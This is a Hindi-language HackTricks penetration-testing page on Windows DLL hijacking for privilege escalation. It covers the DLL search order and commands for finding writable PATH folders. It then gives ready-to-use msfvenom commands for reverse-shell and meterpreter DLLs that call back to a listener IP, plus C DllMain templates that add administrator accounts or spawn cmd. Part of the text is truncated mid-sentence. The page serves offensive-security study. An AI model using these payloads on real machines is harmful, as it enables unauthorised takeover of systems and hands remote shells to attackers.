# डीएल अधिकार हथियाना

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपना योगदान दें।**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - हम नियुक्ति कर रहे हैं! (_अच्छी पोलिश लिखित और बोली जानी चाहिए_).

{% embed url="https://www.stmcyber.com/careers" %}

## परिभाषा

सबसे पहले, चलो परिभाषा निकाल लेते हैं। डीएल हिजैकिंग, सबसे व्यापक रूप में, एक विश्वसनीय/विश्वसनीय एप्लिकेशन को धोखा देना है, जिसमें एक अनियमित डीएल लोड होता है। _डीएल सर्च आर्डर हिजैकिंग_, _डीएल लोड आर्डर हिजैकिंग_, _डीएल स्पूफिंग_, _डीएल इंजेक्शन_ और _डीएल साइड-लोडिंग_ जैसे शब्द अक्सर -गलती से- एक ही बात कहने के लिए प्रयोग किए जाते हैं।

डीएल हिजैकिंग का उपयोग कोड को **चलाने**, **स्थायित्व** प्राप्त करने और **अधिकार हथियाने** के लिए किया जा सकता है। इन 3 में से **सबसे कम संभावित** अधिकार हथियाना है। हालांकि, यह विशेषण हिस्सा है, इसलिए मैं इस विकल्प पर ध्यान केंद्रित करूंगा। इसके अलावा, ध्यान दें कि लक्ष्य के बावजूद, डीएल हिजैकिंग एक ही तरीके से किया जाता है।

### प्रकार

इसमें चयन करने के लिए **विविध दृष्टिकोण** हैं, जिनकी सफलता उस पर निर्भर करती है कि एप्लिकेशन अपनी आवश्यक डीएल को लोड करने के लिए कैसे कॉन्फ़िगर किया गया है। संभावित दृष्टिकोणों में शामिल हैं:

1. **डीएल प्रतिस्थापन**: एक विश्वसनीय डीएल को एक दुष्ट डीएल के साथ बदलें। इसे _डीएल प्रॉक्सींग_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)] के साथ कॉम्बाइन किया जा सकता है, जो सुनिश्चित करता है कि मूल डीएल की सभी कार्यक्षमता संभव होती है।
2. **डीएल सर्च आर्डर हिजैकिंग**: एक ऐप्लिकेशन द्वारा निर्दिष्ट की जाने वाली DLLs बिना पथ के निश्चित क्रम में खोजी जाती हैं \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]। हिजैकिंग सर्च आर्डर उस स्थान पर होती है जहां वास्तविक DLL से पहले खोजी जाती है।
## गुम हो गई DLL का उपयोग करना

विशेषाधिकारों को बढ़ाने के लिए, हमारे पास सबसे अच्छा मौका है कि हम **एक DLL लिख सकें जिसे एक विशेषाधिकार प्रक्रिया लोड करने की कोशिश करेगी** किसी **ऐसे स्थान पर जहां इसे खोजा जाएगा**। इसलिए, हमें यह करने के लिए संभवतः एक **फ़ोल्डर** में एक DLL **लिखने** की क्षमता होगी जहां **वास्तविक DLL** से पहले खोजी जाती है (अजीब मामला), या हमें यह करने की क्षमता होगी कि कुछ फ़ोल्डर पर **लिखें जहां DLL खोजी जाएगी** और मूल **DLL किसी भी फ़ोल्डर में मौजूद नहीं है**।

### DLL खोज क्रम

**माइक्रोसॉफ्ट दस्तावेज़ीकरण** में आपको विशेष रूप से देखने को मिलेगा कि DLL कैसे खोले जाते हैं।

सामान्य रूप से, **Windows एप्लिकेशन** DLL खोजने के लिए **पूर्व-निर्धारित खोज पथ** का उपयोग करेगा और यह निश्चित क्रम में इन पथों की जांच करेगा। DLL हाइजैकिंग आमतौर पर इस समस्या के कारण होती है कि एक खतरनाक DLL को इन फ़ोल्डरों में रखा जाता है जबकि सुनिश्चित किया जाता है कि वास्तविक DLL से पहले यह खोजा जाता है। इस समस्या को दूर किया जा सकता है जब एप्लिकेशन वास्तविक DLL की निर्दिष्ट यात्री पथों को निर्दिष्ट करता है।

आप 32-बिट सिस्टम पर **DLL खोज क्रम** देख सकते हैं:

1. ऐप्लिकेशन ने लोड किया है उस निर्देशिका से।
2. सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) फ़ंक्शन का उपयोग करें। (_C:\Windows\System32_)
3. 16-बिट सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए कोई फ़ंक्शन नहीं है, लेकिन इसे खोजा जाता है। (_C:\Windows\System_)
4. Windows निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) फ़ंक्शन का उपयोग करें। (_C:\Windows_)
5. वर्तमान निर्देशिका।
6. PATH पर्यावरण चर के सूचीबद्ध निर्देशिकाएँ। ध्यान दें कि इसमें **App Paths** रजिस्ट्री कुंजी द्वारा निर्दिष्ट प्रत्येक एप्लिकेशन पथ शामिल नहीं होता है। DLL खोज पथ की गणना करते समय **App Paths** कुंजी का उपयोग नहीं किया जाता है।

यह **डिफ़ॉल्ट** खोज क्रम है जब **SafeDllSearchMode** सक्षम है। जब यह अक्षम हो जाता है, वर्तमान निर्देशिका दूसरे स्थान पर बढ़ जाता है। इस सुविधा को अक्षम करने के लिए, **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** रजिस्ट्री मान को बनाएं और इसे 0 पर सेट करें (डिफ़ॉल्ट सक्षम होता है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** के साथ कॉल किया जाता है, तो खोज उस निर्देशिका में शुरू होती है जिसमें **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **एक DLL केवल नाम के साथ लोड किए जाने पर भी वास्तविक पथ के लिए खोजी जाएगी**। उस मामले में वह DLL **केवल उस पथ में खोजी जाएगी** (यदि DLL के कोई भी आवश्यकताएँ हैं, तो वे नाम के द्वारा लोड किए जाएंगे)।

खोज क्रम को बदलने के अन्य तरीके हैं, लेकिन मैं यहां उन्हें समझाने वाला नहीं हूं।

#### Windows दस्तावेज़ीकरण से DLL खोज क्रम पर अपवाद

* यदि **एक DLL उसी मॉड्यूल नाम के साथ पहले से ही मेमोरी में लोड हो गई है**, तो सिस्टम केवल पुनर्निर्देशन और एक मंचन परिपत्र की जांच करता है पहले से लोड हुई DLL के लिए, चाहे वह किसी भी निर्देशिका में हो। **सिस्टम DLL की खोज नहीं करता है**।
* यदि DLL वह Windows संस्करण के लिए **ज्ञात DLL सूची** में है जिस पर एप्लिकेशन चल रही है, तो **सिस्टम उसके प्रतिलिपि का उपयोग करता है** (और ज्ञात DLL की आवश्यक DLL, यदि कोई हो) **खोज करने के बजाय**। वर्तमान सिस्टम पर ज्ञात DLL की सूची के लिए, निम्नलिखित रजिस्ट्री कुंजी देखें: **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की अनुमतियों की जांच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक executable के imports और एक dll के exports को भी जांच सकते हैं:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
एक पूर्ण गाइड के लिए कैसे **विशेषाधिकार बढ़ाने के लिए Dll Hijacking का दुरुपयोग करें** जिसमें **सिस्टम पथ फ़ोल्डर** में लिखने की अनुमति होती है, देखें:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### स्वचालित उपकरण

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि क्या आपके पास सिस्टम पथ के किसी भी फ़ोल्डर में लिखने की अनुमति है।\
इस दुर्लभता की खोज करने के लिए अन्य रोचक स्वचालित उपकरण हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll_।

### उदाहरण

यदि आप एक उपयोगी स्थिति खोजते हैं तो इसे सफलतापूर्वक उपयोग करने के लिए सबसे महत्वपूर्ण चीजें में से एक होगी कि **एक dll बनाएं जो कम से कम सभी फ़ंक्शन्स को निर्यात करता है जिन्हें एक्ज़ीक्यूटेबल उससे आयात करेगा**। फिर भी, ध्यान दें कि Dll Hijacking मध्यम अधिकार स्तर से उच्च **(UAC को छलने के साथ)** या **उच्च अधिकार से सिस्टम** तक बढ़ाने के लिए उपयोगी होता है। आप एक मान्य dll बनाने का उदाहरण इस dll हिजैकिंग अध्ययन में पा सकते हैं जिसमें dll हिजैकिंग के लिए निर्देशित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **अगले खंड** में आपको कुछ **मूलभूत dll कोड** मिलेगा जो **टेम्पलेट** के रूप में उपयोगी हो सकता है या **अनावश्यक फ़ंक्शन्स को निर्यात करने के लिए एक dll बनाने** के लिए।

## **Dll बनाना और कंपाइल करना**

### **Dll Proxifying**

मूल रूप से एक **Dll प्रॉक्सी** एक Dll है जो **लोड होने पर आपके दुष्ट कोड को निष्पादित करने के लिए सक्षम होता है** लेकिन यह भी **उचित रूप से प्रकट** और **काम करता है** जैसा कि **वास्तविक पुस्तकालय कोल करके सभी कॉल करता है**।

उपकरण \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* या \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\* के साथ आप वास्तव में **एक executable निर्दिष्ट कर सकते हैं और प्रॉक्सीफाइड dll उत्पन्न कर सकते हैं** या **Dll निर्दिष्ट कर सकते हैं और प्रॉक्सीफाइड dll उत्पन्न कर सकते हैं**।

### **Meterpreter**

**रेव शेल प्राप्त करें (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**मीटरप्रेटर प्राप्त करें (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 में x64 संस्करण नहीं देखा गया):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में आपको कंपाइल किए गए Dll में कई फ़ंक्शन्स को **निर्यात करना होगा** जो पीड़ित प्रक्रिया द्वारा लोड किए जाएंगे, यदि ये फ़ंक्शन्स मौजूद नहीं होते हैं तो **बाइनरी उन्हें लोड नहीं कर पाएगा** और **एक्सप्लॉइट विफल हो जाएगा**।
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_अच्छी पोलिश लिखने और बोलने की जानकारी आवश्यक_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>
